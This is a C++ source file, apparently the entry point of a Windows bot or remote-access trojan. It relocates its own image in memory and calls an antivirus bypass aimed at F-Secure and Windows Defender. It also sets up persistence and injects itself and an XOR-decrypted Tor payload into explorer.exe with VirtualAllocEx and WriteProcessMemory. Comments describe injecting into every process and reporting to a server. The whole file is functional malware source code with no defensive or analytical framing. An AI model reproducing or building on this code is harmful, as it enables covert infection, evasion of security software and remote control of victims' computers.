// localhost_safer.cpp : Defines the entry point for the console application.
//

#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include "functions_table.h"

#include "connection.h"

#include <stdio.h>
#include "global_config.h"

#include "process_injections.h"

#include "bot.h"

#include "process_utils.h"

#include <mutex>

#include "persistance.h"
#include "common_utils.h"

#include <psapi.h>

#include "anti_av_fsecure.h"

#include "main.h"

#include "debug.h"
#include "crypto.h"
#include "resource.h"
#include "function_table_core.h"

#if DEBUG_MODE == 1
#define FREECONSOLE 
#else
#define FREECONSOLE l_FreeConsole();
#endif

/*
There're 3 types of running:
	1. installation_mode. - when the bot first executed. SO: it must do installation.
	- the function for this mode is: main()

	2. bootstrap_mode - when the bot installed. SO: it must do some preliminary works and inject the bot into another process for running as bot mode.
	- the function for this mode is: main()

	3. bot_mode - the bot is installed, and injected into an injectable process. SO: 
	- it must communicate with server, send information to server.
	- inject into all process in the operating system.
	- the function for this mode is: manager_InjectionEntryPoint()


*/


static bool inject_bot_into_explorer(LPVOID localCopyImage, DWORD localCopyImage_size);

//
typedef struct {
	LPVOID localCopyImage;
	DWORD localCopyImage_size;
} MAIN_WORKER_THREAD_PARAMS;

DWORD WINAPI main_worker_thread_function(LPVOID main_worker_thread_function_params);

int main(int argc, char* argv[]) 
{
	// step 1. make a local copy of the image.
	PVOID imageBase = l_GetModuleHandleA(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);


	DBG_MSG("MAIN: VirtualAlloc() called.\n");
	PVOID localCopyImage = l_VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);

	if (localCopyImage == NULL) {
		DBG_MSG("MAIN: VirtualAlloc() localCopyImage failed, code: %d\n", l_GetLastError());
		return 1;
	}
	else {
		DBG_MSG("MAIN: VirtualAlloc() localCopyImage success.\n");
	}

	DBG_MSG("MAIN: VirtualAlloc() result, localCopyImage: 0x%p, ntHeader->OptionalHeader.SizeOfImage: 0x%x \n", localCopyImage, ntHeader->OptionalHeader.SizeOfImage);

	//
	MEMORY_BASIC_INFORMATION mbi;
	l_VirtualQuery(localCopyImage, &mbi, sizeof MEMORY_BASIC_INFORMATION);

	DBG_MSG("MAIN: VirtualQuery() result, mbi.AllocationBase: 0x%p, mbi.RegionSize: 0x%x, mbi.Protect: 0x%x \n", mbi.AllocationBase, mbi.RegionSize, mbi.Protect);

	//
	memcpy(localCopyImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	// step 1.1
	DWORD old_protect;
	bool ret_VirtualProtect = l_VirtualProtect(localCopyImage, ntHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &old_protect);

	if (!ret_VirtualProtect)
	{
		DBG_MSG("MAIN: VirtualProtect() localCopyImage to PAGE_EXECUTE_READWRITE failed, error code: %d \n", l_GetLastError());
		return 1;
	}
	else {
		DBG_MSG("MAIN: VirtualProtect() localCopyImage to PAGE_EXECUTE_READWRITE SUCCESS. \n");
	}

	// step 2.

	DWORD_PTR deltaImageBase = (DWORD_PTR)localCopyImage - (DWORD_PTR)imageBase;

	DBG_MSG("MAIN: deltaImageBase: %d \n", deltaImageBase);


	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localCopyImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	DBG_MSG("MAIN: relocationTable->SizeOfBlock > 0\n");
	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);


		DBG_MSG("MAIN: relocationTable->VirtualAddress: 0x%p, relocationTable->SizeOfBlock: %d, relocationEntriesCount: %d \n", relocationTable->VirtualAddress, relocationTable->SizeOfBlock, relocationEntriesCount);

		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localCopyImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaImageBase;
			}
		}

		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

	// step 3.
	LPVOID new_main_worker_thread_function = (LPVOID)((DWORD_PTR)main_worker_thread_function + (DWORD_PTR)deltaImageBase);
	DBG_MSG("MAIN: new_main_worker_thread_function address: 0x%p \n", new_main_worker_thread_function);

	DWORD main_worker_thread_id = 0;
	//
	MAIN_WORKER_THREAD_PARAMS main_worker_thread_params = { 0 };
	main_worker_thread_params.localCopyImage = localCopyImage;
	main_worker_thread_params.localCopyImage_size = ntHeader->OptionalHeader.SizeOfImage;

	HANDLE main_worker_thread_handle = l_CreateThread
	(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)new_main_worker_thread_function,
		(LPVOID)&main_worker_thread_params,
		CREATE_SUSPENDED,
		&main_worker_thread_id
	);

	//
	if (main_worker_thread_handle == NULL) {
		DBG_MSG("MAIN: CreateThread() 'main_worker_thread_handle' failed, error code: %d\n", l_GetLastError());
		return 1;
	}
	else {
		DBG_MSG("MAIN: CreateThread() 'main_worker_thread_handle' success.\n");
	}

	//
	fsecure_windows_defender_runtime_suspect_apis_call_bypass(&main_worker_thread_handle, localCopyImage, ntHeader->OptionalHeader.SizeOfImage);

	//
	DWORD ret_ResumeThread = l_ResumeThread(main_worker_thread_handle);

	if (ret_ResumeThread == -1) {
		DBG_MSG("MAIN: ResumeThread() 'main_worker_thread_handle' failed, error code: %d \n", l_GetLastError());
		return 1;
	}
	else {
		DBG_MSG("MAIN: ResumeThread() 'main_worker_thread_handle' success.\n");
	}


	//
	DBG_MSG("MAIN: WaitForSingleObject() 'main_copy_thread_handle' to finish.\n");
	l_WaitForSingleObject(main_worker_thread_handle, INFINITE);


	return 0;
}

//
//
DWORD WINAPI main_worker_thread_function(LPVOID main_worker_thread_params)
{
	MAIN_WORKER_THREAD_PARAMS * main_worker_thread_params_p = (MAIN_WORKER_THREAD_PARAMS*)main_worker_thread_params;

	LPVOID localCopyImage = main_worker_thread_params_p->localCopyImage;
	DWORD localCopyImage_size = main_worker_thread_params_p->localCopyImage_size;

	DBG_MSG("main_worker_thread_function() - Started. localCopyImage: 0x%p \n", localCopyImage);

	//
	PIMAGE_DOS_HEADER localCopyImage_dosHeader = (PIMAGE_DOS_HEADER)localCopyImage;
	PIMAGE_NT_HEADERS localCopyImage_ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)localCopyImage + localCopyImage_dosHeader->e_lfanew);

	//
	// if we're running in bootstrap_mode already.
	/*
	if (argc >= 2) {
		DBG_MSG("main: Going to melt the file: %s\n", argv[1]);
		l_DeleteFileA(argv[1]);
	}
	*/

	//
	persistance("");

	//
	// main function of bootstrap_mode: inject to an injectable process, then transfer execution to it.
	///////////////////////////////////////////////////////////////////////////////////////////////////
	
	bool ret_inject_bot_into_process = inject_bot_into_explorer(localCopyImage, localCopyImage_size);

	if (!ret_inject_bot_into_process) {
		DBG_MSG("main_worker_thread_function: inject_bot_into_explorer() failed. Try injecting into an arbitrary process.\n");

		//
		ret_inject_bot_into_process = inject_bot_into_explorer(localCopyImage, localCopyImage_size);

		if (!ret_inject_bot_into_process) {
			DBG_MSG("main_worker_thread_function: inject_bot_into_explorer() failed. Return now.\n");

			return 1;
		}
	}
	
	//

	// clean upon exit
	DBG_MSG("main_worker_thread_function: END.\n");

	return 0;
}

static bool inject_tor_payload_into_explorer(PVOID* tor_payload_address, DWORD* tor_payload_len);

static bool inject_bot_into_explorer(LPVOID localCopyImage, DWORD localCopyImage_size)
{
	char* decrypted_str_1 = NULL;

	decrypt_to_string(&decrypted_str_1, EXPLORER_STR, EXPLORER_STR_LEN);

	DWORD target_pid = get_process_id_by_name(decrypted_str_1);

	free(decrypted_str_1);

	if (target_pid) {
		DBG_MSG("main: Going to inject into process id: %d\n", target_pid);

		//pe_injection_main(target_pid);
		PVOID tor_payload_address = NULL;
		DWORD tor_payload_len = 0;

		bool ret_inject_tor_payload = inject_tor_payload_into_explorer(&tor_payload_address, &tor_payload_len);

		if (!ret_inject_tor_payload) {
			DBG_MSG("inject_bot_into_an_injectable_process() - inject_tor_payload_into_explorer() FAILED.\n");
			return false;
		}
		else {
			DBG_MSG("inject_bot_into_an_injectable_process() - inject_tor_payload_into_explorer() SUCCESS. tor_payload_address: 0x%p, tor_payload_len: %d \n", tor_payload_address, tor_payload_len);
		}


		bool ret = main_pe_injection(target_pid, localCopyImage, localCopyImage_size, tor_payload_address, tor_payload_len);

		if (ret) {
			DBG_MSG("inject_bot_into_an_injectable_process() - SUCCESSED injecting into EXPLORER.EXE.\n");

		}
		else {
			DBG_MSG("inject_bot_into_an_injectable_process() - injecting into EXPLORER.EXE FAILED.\n");

			return false;
		}
	}

	return true;
}

static bool inject_tor_payload_into_explorer(PVOID* tor_payload_address, DWORD* tor_payload_len)
{
	char* decrypted_str_1 = NULL;

	decrypt_to_string(&decrypted_str_1, EXPLORER_STR, EXPLORER_STR_LEN);

	DWORD target_pid = get_process_id_by_name(decrypted_str_1);

	free(decrypted_str_1);

	//
	DBG_MSG("OpenProcess()\n");
	HANDLE targetProcess = l_OpenProcess(MAXIMUM_ALLOWED, FALSE, target_pid);

	if (targetProcess == NULL) {
		DBG_MSG("OpenProcess() failed, code: %d\n", l_GetLastError());

		return false;
	}


	//
	DWORD process_exit_code = 0;

	bool get_process_exit_code = l_GetExitCodeProcess(targetProcess, &process_exit_code);

	if (!get_process_exit_code) {
		DBG_MSG("inject_tor_payload_into_explorer() - GetExitCodeProcess() failed, error code: %d. pid: %d. Return now. \n", l_GetLastError(), target_pid);

		return false;
	}

	//
	if (process_exit_code == STILL_ACTIVE) {
		DBG_MSG("inject_tor_payload_into_explorer() - process is STILL_ACTIVE. pid: %d \n", target_pid);
	}
	else {
		DBG_MSG("inject_tor_payload_into_explorer() - process is NOT STILL_ACTIVE. pid: %d. Return now. \n", target_pid);

		return false;
	}

	//
	DWORD TOR_PAYLOAD_LEN;

	char* decrypted_tor_payload = NULL;
	load_program_resource(&decrypted_tor_payload, MAKEINTRESOURCE(IDR_RCDATA1), &TOR_PAYLOAD_LEN);

	if (decrypted_tor_payload == NULL) {
		DBG_MSG("inject_tor_payload_into_explorer() - decrypted_tor_payload is NULL, return now.\n");
		return false;
	}
	else {
		DBG_MSG("inject_tor_payload_into_explorer() - load TOR resource success.\n");
	}

	// This is for running TOR now.
	decrypted_tor_payload = xor_encrypt_decrypt(decrypted_tor_payload, (char*)RAT_ENCRYPTION_KEY, TOR_PAYLOAD_LEN);

	//
	DBG_MSG("inject_tor_payload_into_explorer() - VirtualAllocEx() on targetProcess\n");
	PVOID targetImage = l_VirtualAllocEx(targetProcess, NULL, TOR_PAYLOAD_LEN, MEM_COMMIT, PAGE_READWRITE);

	if (targetImage == NULL) {
		DBG_MSG("inject_tor_payload_into_explorer() - VirtualAllocEx() on targetProcess failed, code: %d\n", l_GetLastError());

		return false;
	}

	bool w_ret = l_WriteProcessMemory(targetProcess, targetImage, decrypted_tor_payload, TOR_PAYLOAD_LEN, NULL);

	if (!w_ret) {
		DBG_MSG("inject_tor_payload_into_explorer() - WriteProcessMemory() failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(targetProcess, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("inject_tor_payload_into_explorer() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}
	else {
		DBG_MSG("inject_tor_payload_into_explorer() - WriteProcessMemory() SUCCESS.\n");
	}

	//
	DBG_MSG("inject_tor_payload_into_explorer() - SUCCESS. tor_payload_address: 0x%p \n", targetImage);

	// Happy end
	*tor_payload_address = targetImage;
	*tor_payload_len = TOR_PAYLOAD_LEN;

	//
	free(decrypted_tor_payload);
	return true;
}

